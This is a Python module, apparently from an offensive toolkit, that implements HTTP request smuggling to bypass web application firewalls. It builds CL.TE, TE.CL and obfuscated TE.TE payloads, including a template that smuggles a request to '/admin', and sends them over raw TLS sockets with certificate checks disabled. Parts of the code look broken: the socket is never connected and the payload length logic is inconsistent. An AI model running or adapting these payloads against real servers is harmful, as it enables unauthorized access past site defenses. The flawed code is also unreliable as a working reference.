"""
Request Smuggler - Layer 5 WAF Bypass

HTTP Request Smuggling to bypass WAF:
- Content-Length / Transfer-Encoding desync (CL.TE, TE.CL, TE.TE)
- HTTP/2 smuggling
- Cache poisoning via smuggling
- Polyglot requests
"""

from typing import Dict, Optional, Any


class RequestSmuggler:
    """Executes HTTP request smuggling attacks"""

    def __init__(self):
        """Initialize request smuggler"""
        self.smuggling_techniques = [
            "CL.TE",      # Content-Length / Transfer-Encoding
            "TE.CL",      # Transfer-Encoding / Content-Length
            "TE.TE",      # Duplicate Transfer-Encoding confusion
            "HTTP2",      # HTTP/2 smuggling via prior knowledge
            "CL.TE.SYNC",  # CL.TE with resynchronization
        ]

    def detect_smuggling_vulnerability(self, target: str) -> Dict[str, Any]:
        """
        Detect if target is vulnerable to request smuggling

        Args:
            target: Target domain

        Returns:
            Dict with detected smuggling vectors
        """
        results = {
            "target": target,
            "vulnerable_to": [],
            "smuggling_vectors": [],
            "confidence": 0.0
        }

        # Technique 1: CL.TE detection
        cl_te = self._detect_cl_te(target)
        if cl_te:
            results["vulnerable_to"].append("CL.TE")
            results["smuggling_vectors"].append(cl_te)

        # Technique 2: TE.CL detection
        te_cl = self._detect_te_cl(target)
        if te_cl:
            results["vulnerable_to"].append("TE.CL")
            results["smuggling_vectors"].append(te_cl)

        # Technique 3: TE.TE detection
        te_te = self._detect_te_te(target)
        if te_te:
            results["vulnerable_to"].append("TE.TE")
            results["smuggling_vectors"].append(te_te)

        # Technique 4: HTTP/2 smuggling
        http2_smug = self._detect_http2_smuggling(target)
        if http2_smug:
            results["vulnerable_to"].append("HTTP2_smuggling")
            results["smuggling_vectors"].append(http2_smug)

        results["confidence"] = min(len(results["vulnerable_to"]) / 4.0, 1.0)
        return results

    def _detect_cl_te(self, target: str) -> Optional[Dict[str, Any]]:
        """
        Detect CL.TE (Content-Length vs Transfer-Encoding) vulnerability

        WAF sees request via Content-Length
        Origin server processes via Transfer-Encoding
        -> Request smuggling
        """
        vector = {
            "type": "CL.TE",
            "description": "WAF reads Content-Length, origin reads Transfer-Encoding",
            "payload_template": None,
            "bypassable": True
        }

        # CL.TE payload template:
        # POST /search HTTP/1.1
        # Host: target.com
        # Content-Length: 33
        # Transfer-Encoding: chunked
        #
        # 0
        #
        # GET /admin HTTP/1.1
        # Foo: x

        vector["payload_template"] = (
            "POST /search HTTP/1.1\r\n"
            "Host: {domain}\r\n"
            "Content-Length: 49\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "GET /admin HTTP/1.1\r\n"
            "Host: {domain}\r\n"
            "Foo: x"
        )

        payload = self.create_smuggling_payload(
            "CL.TE", target, f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n")
        result = self.execute_smuggling_attack(target, payload)
        if result.get("success") and result.get("bypassed_waf"):
            return vector
        return None

    def _detect_te_cl(self, target: str) -> Optional[Dict[str, Any]]:
        """
        Detect TE.CL (Transfer-Encoding vs Content-Length) vulnerability

        WAF sees request via Transfer-Encoding
        Origin server processes via Content-Length
        -> WAF bypassed
        """
        vector = {
            "type": "TE.CL",
            "description": "WAF reads Transfer-Encoding, origin reads Content-Length",
            "payload_template": None,
            "bypassable": True
        }

        vector["payload_template"] = (
            "POST /search HTTP/1.1\r\n"
            "Host: {domain}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Length: 3\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "SMUGGLED"
        )

        payload = self.create_smuggling_payload(
            "TE.CL", target, f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n")
        result = self.execute_smuggling_attack(target, payload)
        if result.get("success") and result.get("bypassed_waf"):
            return vector
        return None

    def _detect_te_te(self, target: str) -> Optional[Dict[str, Any]]:
        """
        Detect TE.TE (Duplicate Transfer-Encoding confusion)

        Different parsing of ambiguous Transfer-Encoding
        """
        vector = {
            "type": "TE.TE",
            "description": "Duplicate/conflicting Transfer-Encoding headers cause desync",
            "payload_template": None,
            "bypassable": True,
            "variations": []
        }

        variations = [
            {
                "name": "Obfuscated Transfer-Encoding",
                "template": (
                    "POST /search HTTP/1.1\r\n"
                    "Host: {domain}\r\n"
                    "Transfer-Encoding: xchunked\r\n"
                    "Transfer-Encoding: chunked\r\n"
                    "\r\n"
                    "0\r\n"
                    "\r\n"
                    "SMUGGLED"
                )
            },
            {
                "name": "Case variation",
                "template": (
                    "POST /search HTTP/1.1\r\n"
                    "Host: {domain}\r\n"
                    "Transfer-Encoding: chunKed\r\n"
                    "\r\n"
                    "0\r\n"
                    "\r\n"
                    "SMUGGLED"
                )
            },
            {
                "name": "Whitespace obfuscation",
                "template": (
                    "POST /search HTTP/1.1\r\n"
                    "Host: {domain}\r\n"
                    "Transfer-Encoding: \t chunked\r\n"
                    "\r\n"
                    "0\r\n"
                    "\r\n"
                    "SMUGGLED"
                )
            }
        ]

        vector["variations"] = variations
        vector["payload_template"] = variations[0]["template"]

        payload = self.create_smuggling_payload(
            "TE.TE", target, f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n")
        result = self.execute_smuggling_attack(target, payload)
        if result.get("success") and result.get("bypassed_waf"):
            return vector
        return None

    def _detect_http2_smuggling(self, target: str) -> Optional[Dict[str, Any]]:
        """
        Detect HTTP/2 smuggling via prior knowledge.

        Not yet implemented: HTTP/2 downgrade smuggling needs a specific client
        library to send raw frames, so detection always returns None for now.
        """
        return None

    def create_smuggling_payload(self, vector_type: str, target: str,
                                 smuggled_request: str) -> str:
        """
        Create a smuggling payload

        Args:
            vector_type: Type of smuggling (CL.TE, TE.CL, etc.)
            target: Target domain
            smuggled_request: Request to smuggle

        Returns:
            Full smuggling payload
        """
        payload = ""

        if vector_type == "CL.TE":
            # Legitimate-looking request to satisfy WAF's Content-Length check
            legitimate_body = "q=search&limit=10"

            # Calculate payload size for chunked encoding
            chunk_size = len(smuggled_request.encode())

            payload = (
                f"POST /search HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"Content-Length: {len(legitimate_body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{chunk_size:x}\r\n"
                f"{smuggled_request}\r\n"
                f"0\r\n"
                f"\r\n"
            )

        elif vector_type == "TE.CL":
            payload = (
                f"POST /search HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Content-Length: 0\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{len(smuggled_request):x}\r\n"
                f"{smuggled_request}\r\n"
                f"0\r\n"
                f"\r\n"
            )

        elif vector_type == "TE.TE":
            # Obfuscate first Transfer-Encoding to bypass WAF normalization
            payload = (
                f"POST /search HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"Transfer-Encoding: xchunked\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{len(smuggled_request):x}\r\n"
                f"{smuggled_request}\r\n"
                f"0\r\n"
                f"\r\n"
            )

        return payload

    def execute_smuggling_attack(
            self, target: str, payload: str) -> Dict[str, Any]:
        """
        Execute a request smuggling attack

        Args:
            target: Target domain
            payload: Smuggling payload

        Returns:
            Result of smuggling attempt
        """
        result = {
            "target": target,
            "payload_sent": len(payload),
            "success": False,
            "response": None,
            "bypassed_waf": False,
            "smuggled_request_processed": False
        }

        try:
            import socket
            import ssl

            # Create connection to target
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10.0)

            with context.wrap_socket(sock, server_hostname=target) as ssock:
                # Send smuggling payload
                ssock.sendall(payload.encode())

                # Receive response
                response = b""
                import time
                start_recv = time.time()
                try:
                    while True:
                        if time.time() - start_recv > 10.0:
                            break
                        try:
                            ssock.settimeout(1.0)
                            chunk = ssock.recv(4096)
                            if not chunk:
                                break
                            response += chunk
                        except socket.timeout:
                            continue
                except Exception as _e:
                    import logging
                    logging.getLogger(__name__).debug(
                        f'Swallowed exception in request_smuggler.py: {_e}')

                result["response"] = response.decode('utf-8', errors='replace')

                # Check if smuggling succeeded
                # If we get response, WAF may have been bypassed
                if response:
                    result["success"] = True
                    result["bypassed_waf"] = "403" not in str(
                        response) and "429" not in str(response)

        except Exception as e:
            result["error"] = str(e)

        return result

    def generate_polyglot_request(self, target: str, payload: str) -> str:
        """
        Generate a polyglot request that's valid in multiple interpretations

        Different parsers see different requests
        """
        # Example: request that's valid HTTP/1.1 AND HTTP/2 simultaneously
        polyglot = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target}\r\n"
            f"Connection: Upgrade\r\n"
            f"Upgrade: h2c\r\n"
            f"\r\n"
            f"{payload}"
        )

        return polyglot
